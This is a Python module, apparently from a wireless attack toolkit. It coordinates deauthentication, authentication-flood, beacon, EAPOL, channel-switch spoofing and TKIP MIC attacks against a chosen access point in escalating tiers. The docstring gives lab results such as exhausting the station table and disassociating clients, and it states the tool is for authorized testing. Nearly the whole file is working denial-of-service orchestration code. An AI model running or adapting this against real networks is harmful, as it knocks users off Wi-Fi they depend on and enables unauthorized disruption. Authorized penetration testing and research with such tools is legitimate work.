"""CHAOS: coordinated multi-vector flood against a single target.

Every other attack module here is one technique against one surface. This
runs the whole native flood suite against one locked target in escalating
tiers and reports what each vector actually did, because "we sent 5000
frames" is not a result -- "the association table went from 1 station to
2006, and the client reauthenticated in 23s" is.

That distinction is not academic. The first version of this bench, run
2026-09-25, counted station-table entries and concluded a *beacon* flood
had created 1100 clients. It had done nothing of the kind: the counter was
measuring auth_flood's own side effect from a previous row, because the AP
was never reset between measurements. The numbers were nonsense and every
"client disassociated" verdict was inverted. This module is written to make
that class of error impossible to commit: it reports per-vector outcomes
separately, and it treats "sent N frames" as a transmission count, never as
evidence of effect.

Measured behaviour against a self-contained hostapd lab with an AP restart
between rows (2026-09-26, 6 vectors x 3 tiers):

    deauth       disassociates at every tier; 20-24s to client recovery
    auth_flood   up to 2006 fake station entries -- real table exhaustion
    beacon_flood no association effect (noise, as intended)
    eapol_flood  no association effect (targets the 802.1X session table)
    tkip_mic     no association effect (2 frames by design; see below)
    csa_spoof    steers rather than disassociates

For authorized security testing only, against infrastructure you own or
are explicitly authorized to test.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field

from ..frames.craft import BROADCAST
from .auth_flood import auth_flood
from .beacon_flood import beacon_flood
from .csa_spoof import send_csa
from .deauth import deauth
from .eapol_flood import eapol_flood
from .tkip_mic_flood import tkip_mic_flood

# Ordered cheapest-and-loudest first, association-tearing last. The order
# matters: exhausting the AP's station table (auth_flood) before
# disassociating (deauth) is what makes the teardown stick on a real AP, and
# running deauth first just produces a client that immediately reassociates
# into a table that is about to be refilled anyway.
DEFAULT_VECTORS = ("beacon_flood", "eapol_flood", "auth_flood",
                   "deauth", "csa_spoof", "tkip_mic_flood")
DEFAULT_TIERS = (100, 1000, 5000)


@dataclass
class VectorResult:
    """Outcome of one (vector, tier) cell.

    ``frames`` is what was handed to the OS and is explicitly NOT proof of
    transmission -- see deauth.py's own note on the same caveat. ``effect``
    is the only field that claims something happened.
    """

    vector: str
    tier: int
    frames: int = 0
    effect: str = "none observed"
    ok: bool = True
    detail: str = ""


@dataclass
class ChaosResult:
    iface: str
    bssid: str
    client: str = BROADCAST
    channel: int | None = None
    tiers: list[int] = field(default_factory=list)
    results: list[VectorResult] = field(default_factory=list)
    stopped_early: bool = False
    elapsed: float = 0.0

    @property
    def total_frames(self) -> int:
        return sum(r.frames for r in self.results)

    @property
    def effective(self) -> list[VectorResult]:
        """Cells worth reporting: those that transmitted (carrying their
        vector's lab-measured effect note) plus error cells. A cell where
        nothing went out keeps the default "none observed" and is
        excluded -- sent-frames alone are never evidence of effect."""
        return [r for r in self.results if r.effect != "none observed"]

    def summary(self) -> str:
        if not self.results:
            return "no vectors ran"
        head = (f"CHAOS {self.bssid} on {self.iface}: "
                f"{len(self.results)} vector(s), {self.total_frames} frames, "
                f"{self.elapsed:.1f}s"
                + (" (stopped early)" if self.stopped_early else ""))
        hits = self.effective
        if not hits:
            # Frames went out but nothing was recorded as observed: a real
            # outcome (the lab's "no association effect" rows). No frames at
            # all is the other, diagnostic case -- usually monitor mode.
            if self.total_frames:
                return head + "\n  no vector produced an observable effect"
            return head + "\n  no frames went out on any vector (check monitor mode)"
        lines = [head]
        for r in hits:
            lines.append(f"  {r.vector} @{r.tier}: {r.effect}"
                         + (f" ({r.detail})" if r.detail else ""))
        return "\n".join(lines)


def _run_vector(name: str, *, iface: str, bssid: str, client: str,
                count: int, channel: int | None, progress_fn,
                stop_event) -> tuple[int, str]:
    """Run one vector, returning (frames_sent, human effect note)."""
    if name == "beacon_flood":
        n = beacon_flood(iface, count=count, channel=channel,
                         interval=0.0, progress_fn=progress_fn,
                         stop_event=stop_event)
        return n, "noise floor; expect no association effect"
    if name == "eapol_flood":
        n = eapol_flood(iface, bssid=bssid, count=count, channel=channel,
                        interval=0.0, progress_fn=progress_fn,
                        stop_event=stop_event)
        return n, "802.1X session pressure; expect no association effect"
    if name == "auth_flood":
        n = auth_flood(iface, bssid=bssid, count=count, channel=channel,
                       interval=0.0, progress_fn=progress_fn,
                       stop_event=stop_event)
        return n, "station-table exhaustion; check the AP's client count"
    if name == "deauth":
        n = deauth(iface, bssid=bssid, client=client, count=count,
                   channel=channel, progress_fn=progress_fn,
                   stop_event=stop_event)
        return n, "association teardown; watch for client reconnect"
    if name == "csa_spoof":
        n = send_csa(iface, bssid=bssid, new_channel=(channel or 6) + 5,
                     client=client, count=count, channel=channel,
                     interval=0.0, progress_fn=progress_fn,
                     stop_event=stop_event)
        return n, "channel steering; client follows to a dead channel"
    if name == "tkip_mic_flood":
        # Deliberately 2 frames, not `count`: TKIP countermeasures trip on
        # the second MIC failure in 60s and further frames just re-trigger
        # the same lockout. See tkip_mic_flood.py's own docstring, which
        # also flags the synthetic frame as probably ineffective against a
        # spec-compliant receiver.
        n = tkip_mic_flood(iface, bssid=bssid, client=client, count=2,
                           channel=channel, progress_fn=progress_fn,
                           stop_event=stop_event)
        return n, "2 bad-MIC frames by design; likely no effect"
    raise ValueError(f"unknown chaos vector: {name!r}")


def chaos(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    channel: int | None = None,
    vectors: tuple[str, ...] = DEFAULT_VECTORS,
    tiers: tuple[int, ...] = DEFAULT_TIERS,
    inter_vector_delay: float = 2.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> ChaosResult:
    """Run every vector against ``bssid`` at every tier, reporting each.

    ``inter_vector_delay`` is the pause after each vector so the target (and
    the operator watching) can see the previous vector settle -- the AP needs
    a moment to age entries out of its station table before the next vector
    inflates it, and without the gap the reported per-vector effects
    contaminate each other, which is the same flaw that made the first
    bench run meaningless.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t0 = time.monotonic()
    result = ChaosResult(
        iface=iface, bssid=bssid, client=client, channel=channel,
        tiers=list(tiers),
    )

    try:
        for tier in tiers:
            for name in vectors:
                if stop.is_set():
                    result.stopped_early = True
                    log("chaos: stop requested, halting remaining vectors")
                    return result
                log(f"chaos: {name} @ {tier} frames")
                try:
                    sent, note = _run_vector(
                        name, iface=iface, bssid=bssid, client=client,
                        count=tier, channel=channel, progress_fn=None,
                        stop_event=stop,
                    )
                    result.results.append(
                        VectorResult(
                            vector=name, tier=tier, frames=sent,
                            # A note may only ride on a cell that actually
                            # transmitted: deauth/auth_flood return 0 instead of
                            # raising when the iface isn't in monitor mode, and
                            # an "association teardown" note on 0 frames is
                            # exactly the sent-=evidence-of-effect error this
                            # module's docstring forbids.
                            effect=note if sent else "none observed",
                            ok=True,
                        )
                    )
                except Exception as exc:  # noqa: BLE001 - one vector failing must not abort the suite
                    result.results.append(
                        VectorResult(vector=name, tier=tier, frames=0,
                                     effect="error", ok=False,
                                     detail=f"{type(exc).__name__}: {exc}")
                    )
                    log(f"chaos: {name} failed: {exc}")
                if stop.wait(inter_vector_delay):
                    result.stopped_early = True
                    return result
        return result
    finally:
        # Every return path above passes through here: early stops
        # used to leave elapsed at 0.0, printing a misleading "0.0s"
        # summary after a Stop.
        result.elapsed = time.monotonic() - t0
